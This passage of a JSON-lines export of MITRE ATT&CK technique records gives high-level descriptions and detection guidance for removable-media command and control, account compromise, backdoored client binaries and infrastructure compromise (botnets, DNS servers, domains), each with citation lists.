TrendMicro Lazarus Nov 2018),(Citation: Deep Instinct TA505 Apr 2019),(Citation: Unit42 BabyShark Feb 2019),(Citation: Fidelis njRAT June 2013),(Citation: Mandiant UNC3313 Feb 2022),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: Unit 42 Lucifer June 2020),(Citation: Talos Seduploader Oct 2017),(Citation: PaloAlto NanoCore Feb 2016),(Citation: FireEye FIN7 March 2017),(Citation: Unit 42 PingPull Jun 2022),(Citation: McAfee Night Dragon),(Citation: US-CERT Bankshot Dec 2017),(Citation: Carbon Black JCry May 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Bitdefender FIN8 July 2021),(Citation: Talos Bisonal Mar 2020),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: RATANKBA),(Citation: Proofpoint TA505 October 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: US-CERT SHARPKNOT June 2018),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Cisco DNSMessenger March 2017),(Citation: Forcepoint Monsoon),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: FireEye APT41 March 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: Unit42 Molerat Mar 2020),(Citation: Symantec Shuckworm January 2022),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: McAfee Babuk February 2021),(Citation: Group IB Cobalt Aug 2017),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Unit42 OilRig Nov 2018),(Citation: Github AD-Pentest-Script),(Citation: FireEye FIN10 June 2017),(Citation: Qualys LolZarus),(Citation: Lee 2013),(Citation: Volexity PowerDuke November 2016),(Citation: Malwarebytes Konni Aug 2021),(Citation: Dell Sakula),(Citation: ESET GreyEnergy Oct 2018),(Citation: Lazarus RATANKBA),(Citation: Symantec Darkmoon Aug 2005),(Citation: US-CERT HARDRAIN March 2018),(Citation: Dell TG-3390),(Citation: TechNet Cmd),(Citation: Kaspersky Lyceum October 2021),(Citation: Talos Group123),(Citation: GDATA Zeus Panda June 2017),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: FireEye Periscope March 2018),(Citation: SentinelLabs Metador Sept 2022),(Citation: Cylance Shell Crew Feb 2017),(Citation: US-CERT Volgmer Nov 2017),(Citation: NCC Group Chimera January 2021),(Citation: Umbreon Trend Micro),(Citation: Lotus Blossom Dec 2015),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Kaspersky QakBot September 2021),(Citation: US-CERT TA18-074A),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Talos Lokibot Jan 2021),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Check Point Meteor Aug 2021),(Citation: FireEye APT38 Oct 2018),(Citation: Cymmetria Patchwork),(Citation: FireEye CARBANAK June 2017),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: FireEye Obfuscation June 2017),(Citation: PTSecurity Higaisa 2020),(Citation: Talos Konni May 2017),(Citation: Korean FSI TA505 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: Threatpost Lizar May 2021),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 Bisonal July 2018),(Citation: Checkpoint IndigoZebra July 2021),(Citation: NCSC Joint Report Public Tools),(Citation: Crowdstrike DNC June 2016),(Citation: Unit42 Cannon Nov 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Tarrask scheduled task),(Citation: Symantec MuddyWater Dec 2018),(Citation: ESET Sednit Part 2),(Citation: JPCert TSCookie March 2018),(Citation: Proofpoint TA505 Jan 2019),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: RedCanary Mockingbird May 2020),(Citation: Zscaler Kasidet),(Citation: Talos Sodinokibi April 2019),(Citation: ClearSky Wilted Tulip July 2017),(Citation: ClearSky Siamesekitten August 2021),(Citation: Secureworks Karagany July 2019),(Citation: CrowdStrike Ryuk January 2019),(Citation: Talos Cobalt Group July 2018),(Citation: Cofense NanoCore Mar 2018),(Citation: Picus Emotet Dec 2018),(Citation: JoeSecurity Egregor 2020),(Citation: Unit 42 Gamaredon February 2022),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Rancor Unit42 June 2018),(Citation: Cybereason Egregor Nov 2020),(Citation: Novetta Blockbuster Destructive Malware),(Citation: CERT-EE Gamaredon January 2021),(Citation: Kaspersky Adwind Feb 2016),(Citation: Cisco H1N1 Part 2),(Citation: FireEye APT30),(Citation: Google EXOTIC LILY March 2022),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Proofpoint NETWIRE December 2020),(Citation: CarbonBlack Conti July 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Securelist Remexi Jan 2019),(Citation: ESET Gelsemium June 2021),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Sophos Maze VM September 2020),(Citation: Talos TinyTurla September 2021),(Citation: Cybereason Soft Cell June 2019),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Volexity SolarWinds),(Citation: Unit 42 RGDoor Jan 2018),(Citation: FireEye APT10 April 2017),(Citation: PWC Cloud Hopper April 2017),(Citation: Cybereason Molerats Dec 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: ESET LoudMiner June 2019),(Citation: Anomali Evasive Maneuvers July 2015),(Citation: Palo Alto OilRig Sep 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: McAfee Cuba April 2021),(Citation: F-Secure CozyDuke),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Check Point Warzone Feb 2020),(Citation: FireEye FELIXROOT July 2018),(Citation: Unit 42 Siloscape Jun 2021),(Citation: IBM MegaCortex),(Citation: DFIR Ryuk's Return October 2020),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Cylance Dust Storm),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Dell Lateral Movement),(Citation: ESET Turla PowerShell May 2019),(Citation: Malwarebytes Higaisa 2020),(Citation: Talos GravityRAT),(Citation: NCC Group WastedLocker June 2020),(Citation: Trend Micro Daserf Nov 2017),(Citation: Malwarebytes Pony April 2016),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Medium KONNI Jan 2020),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Frankenstein June 2019),(Citation: Zscaler Higaisa 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: ESET RTM Feb 2017),(Citation: GitHub QuasarRAT),(Citation: Cybereason Clop Dec 2020),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Zscaler Cobian Aug 2017),(Citation: Malwarebytes DarkComet March 2018),(Citation: McAfee GhostSecret),(Citation: Secureworks REvil September 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: CyberBit Dtrack),(Citation: Fortinet Remcos Feb 2017),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Cybereason Oceanlotus May 2017),(Citation: FoxIT Wocao December 2019),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: SecureWorks August 2019),(Citation: ESET Okrum July 2019),(Citation: McAfee Lazarus Jul 2020),(Citation: Trend Micro TA505 June 2019),(Citation: Github PowerShell Empire),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Github Koadic),(Citation: Unit 42 QUADAGENT July 2018),(Citation: FireEye APT37 Feb 2018),(Citation: Sofacy DealersChoice),(Citation: Prevailion DarkWatchman 2021),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Gamaredon June 2020),(Citation: Group IB GrimAgent July 2021),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: McAfee Gold Dragon),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: McAfee Oceansalt Oct 2018),(Citation: McAfee Honeybee),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Palo Alto DNS Requests),(Citation: Talos Kimsuky Nov 2021),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Bitdefender Naikon April 2021),(Citation: Trend Micro Tick November 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Avira Mustang Panda January 2020),(Citation: Unit 42 OilRig Sept 2018),(Citation: Bitdefender APT28 Dec 2015),(Citation: CrowdStrike Putter Panda),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Talos PoetRAT October 2020),(Citation: Unit 42 CARROTBAT January 2020),(Citation: CISA EB Aug 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Volexity Patchwork June 2018),(Citation: FireEye FIN7 Aug 2018),(Citation: ESET TeleBots Oct 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Radware Micropsia July 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Novetta Blockbuster),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: FireEye FIN6 Apr 2019),(Citation: Dell TG-1314),(Citation: FireEye Operation Double Tap),(Citation: Cylance Sodinokibi July 2019),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Secureworks MCMD July 2019),(Citation: CISA Zebrocy Oct 2020),(Citation: DFIR Phosphorus November 2021),(Citation: Symantec Backdoor.Mivast),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: ESET EvilNum July 2020),(Citation: Unit42 RDAT July 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: PaloAlto DNS Requests May 2016),(Citation: Cybereason Kimsuky November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: 360 Machete Sep 2020),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Medium Metamorfo Apr 2020),(Citation: Cybereason Astaroth Feb 2019),(Citation: Symantec Buckeye),(Citation: ESET InvisiMole June 2020),(Citation: Symantec Linfo May 2012),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Microsoft GALLIUM December 2019),(Citation: Symantec Waterbug Jun 2019),(Citation: FireEye APT32 May 2017),(Citation: TrendMicro Trickbot Feb 2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Microsoft BlackCat Jun 2022),(Citation: Accenture Lyceum Targets November 2021),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Intezer HiddenWasp Map 2019),(Citation: OilRig ISMAgent July 2017),(Citation: ESET ComRAT May 2020),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: FireEye APT10 Sept 2018),(Citation: Sophos Ragnar May 2020),(Citation: Cylance Cleaver),(Citation: CarbonBlack RobbinHood May 2019),(Citation: Secureworks BRONZEUNION Feb 2019),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Crowdstrike Indrik November 2018),(Citation: Trend Micro Ransomware February 2021),"}
{"ID":"T1092","name":"Communication Through Removable Media","description":"Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.","url":"https://attack.mitre.org/techniques/T1092","created":"31 May 2017","last modified":"14 July 2020","version":"1.0","tactics":"Command and Control","detection":"Monitor file access on removable media. Detect processes that execute when removable media is mounted.","platforms":"Linux, Windows, macOS","data sources":"Drive: Drive Access, Drive: Drive Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Sednit Part 2),(Citation: Microsoft SIR Vol 19),(Citation: ESET Sednit USBStealer 2014),(Citation: FireEye APT28),(Citation: TechNet Removable Media Control),(Citation: Microsoft Disable Autorun)"}
{"ID":"T1586","name":"Compromise Accounts","description":"Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).","url":"https://attack.mitre.org/techniques/T1586","created":"01 October 2020","last modified":"11 April 2023","version":"1.2","tactics":"Resource Development","detection":"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).","platforms":"PRE","data sources":"Network Traffic: Network Traffic Content, Persona: Social Media","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1586.003","name":"Compromise Accounts: Cloud Accounts","description":"Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)\n\nA variety of methods exist for compromising cloud accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003) attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: MSTIC Nobelium Oct 2021) Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) between service providers and their customers.(Citation: MSTIC Nobelium Oct 2021)","url":"https://attack.mitre.org/techniques/T1586/003","created":"27 May 2022","last modified":"21 October 2022","version":"1.0","tactics":"Resource Development","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during exfiltration (ex: [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)).","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1586","defenses bypassed":null,"contributors":"Francesco Bigarella","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Mandiant APT29 Microsoft 365 2022),"}
{"ID":"T1586.002","name":"Compromise Accounts: Email Accounts","description":"Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).\n\nA variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566) emails may evade reputation-based email filtering rules.\n\nAdversaries can use a compromised email account to hijack existing email threads with targets of interest.","url":"https://attack.mitre.org/techniques/T1586/002","created":"01 October 2020","last modified":"11 April 2023","version":"1.1","tactics":"Resource Development","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1586","defenses bypassed":null,"contributors":"Bryan Onel; Tristan Bennett, Seamless Intelligence","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Malwarebytes Kimsuky June 2021),(Citation: VirusBulletin Kimsuky October 2019),(Citation: SecureWorks August 2019),(Citation: ANSSI Nobelium Phishing December 2021),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: CISA AA21-200A APT40 July 2021),(Citation: IBM ITG18 2020),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1586.001","name":"Compromise Accounts: Social Media Accounts","description":"Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).","url":"https://attack.mitre.org/techniques/T1586/001","created":"01 October 2020","last modified":"16 October 2021","version":"1.1","tactics":"Resource Development","detection":"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).","platforms":"PRE","data sources":"Network Traffic: Network Traffic Content, Persona: Social Media","is sub-technique":true,"sub-technique of":"T1586","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: CISA AA21-200A APT40 July 2021),"}
{"ID":"T1554","name":"Compromise Client Software Binary","description":"Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.\n\nAdversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.","url":"https://attack.mitre.org/techniques/T1554","created":"11 February 2020","last modified":"19 October 2021","version":"1.0","tactics":"Persistence","detection":"Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment. Look for changes to client software that do not correlate with known software or patch cycles. \n\nConsider monitoring for anomalous behavior from client applications, such as atypical module loads, file reads/writes, or network connections.","platforms":"Linux, Windows, macOS","data sources":"File: File Creation, File: File Deletion, File: File Metadata, File: File Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"CrowdStrike Falcon OverWatch","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: reed thiefquest ransomware analysis),(Citation: ESET ForSSHe December 2018),(Citation: ESET Kobalos Jan 2021),(Citation: ESET Ebury Feb 2014),(Citation: wardle evilquest partii),(Citation: ESET Industroyer),(Citation: trendmicro xcsset xcode project 2020),"}
{"ID":"T1584","name":"Compromise Infrastructure","description":"Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\n\nUse of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) Additionally, adversaries may also compromise infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090).(Citation: amnesty_nso_pegasus)\n\nBy using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)","url":"https://attack.mitre.org/techniques/T1584","created":"01 October 2020","last modified":"12 April 2023","version":"1.3","tactics":"Resource Development","detection":"Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet. \n\nOnce adversaries have provisioned compromised infrastructure (ex: a server for use in command and control), internet scans may help proactively discover compromised infrastructure. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":"PRE","data sources":"Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS, Internet Scan: Response Content, Internet Scan: Response Metadata","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Jeremy Galloway; Shailesh Tiwary (Indian Army)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1584.005","name":"Compromise Infrastructure: Botnet","description":"Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).","url":"https://attack.mitre.org/techniques/T1584/005","created":"01 October 2020","last modified":"19 April 2022","version":"1.0","tactics":"Resource Development","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during [Phishing](https://attack.mitre.org/techniques/T1566), [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499), or [Network Denial of Service](https://attack.mitre.org/techniques/T1498).","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1584","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Novetta-Axiom),(Citation: NCSC Cyclops Blink February 2022),"}
{"ID":"T1584.002","name":"Compromise Infrastructure: DNS Server","description":"Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.\n\nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation: Crowdstrike DNS Hijack 2019) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)","url":"https://attack.mitre.org/techniques/T1584/002","created":"01 October 2020","last modified":"19 April 2022","version":"1.2","tactics":"Resource Development","detection":"Consider monitoring for anomalous resolution changes for domain addresses. Efforts may need to be tailored to specific domains of interest as benign resolution changes are a common occurrence on the internet.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":"PRE","data sources":"Domain Name: Active DNS, Domain Name: Passive DNS","is sub-technique":true,"sub-technique of":"T1584","defenses bypassed":null,"contributors":"Jeremy Galloway","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1584.001","name":"Compromise Infrastructure: Domains","description":"Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.(Citation: Krebs DNS Hijack 2019)\n\nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)\n\nAdversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)","url":"https://attack.mitre.org/techniques/T1584/001","created":"01 October 2020","last modified":"07 March 2023","version":"1.3","tactics":"Resource Development","detection":"Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.","platforms":"PRE","data sources":"Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS","is sub-technique":true,"sub-technique of":"T1584","defenses bypassed":null,"contributors":"Jeremy Galloway","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Certfa Charming Kitten January 2021),(Citation: McAfee Lazarus Jul 2020),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: McAfee Lazarus Nov 2020),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: KISA Operation Muzabi),(Citation: Mandiant APT1),(Citation: Proofpoint TA453 July2021),(Citation: Microsoft Unidentified Dec 2018),(Citation: Google Iran Threats October 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: MSTIC NOBELIUM Mar 2021),"}
